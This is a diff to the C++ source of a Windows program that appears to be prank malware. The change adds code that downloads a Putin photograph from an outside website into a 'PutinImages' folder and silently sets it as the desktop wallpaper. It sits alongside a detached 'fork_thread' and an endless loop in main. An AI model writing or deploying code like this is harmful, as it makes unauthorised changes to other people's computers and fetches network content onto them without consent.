@@ -5,11 +5,12 @@
 #include <string.h>
 #include <string>
 #include <thread>
-#include <curl/curl.h>
+#include <Urlmon.h>
 
 #define MAX_PATH 260
 #pragma warning(disable : 4996)
 #pragma comment(lib,"Wininet.lib")
+#pragma comment(lib,"urlmon.lib")
 
 using namespace std;
 
@@ -99,7 +100,7 @@ public:
 		}	
 	}
 
-	void install_images() {
+	void wallpaper_func() {
 		get_main_drive();
 		strcat(main_drive, "PutinImages");
 
@@ -108,7 +109,19 @@ public:
 		if (!dirExists(dup)) {
 			CreateDirectoryA(main_drive, NULL);
 		}
+		
+		
+		const char* imageUrl = "https://wegotthiscovered.com/wp-content/uploads/2022/12/vladimir-putin.jpg";
 
+		
+		std::string imagePath = dup + "\\vladimir-putin.jpg";
+
+		URLDownloadToFileA(NULL, imageUrl, imagePath.c_str(), 0, NULL);
+
+
+		
+		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)imagePath.c_str(), SPIF_UPDATEINIFILE);
+	
 	}
 };
 
@@ -134,7 +147,7 @@ int main() {
 	
 	fork_thread.detach();
 
-	Obj.install_images();
+	Obj.wallpaper_func();
 
 
 	while (1) {
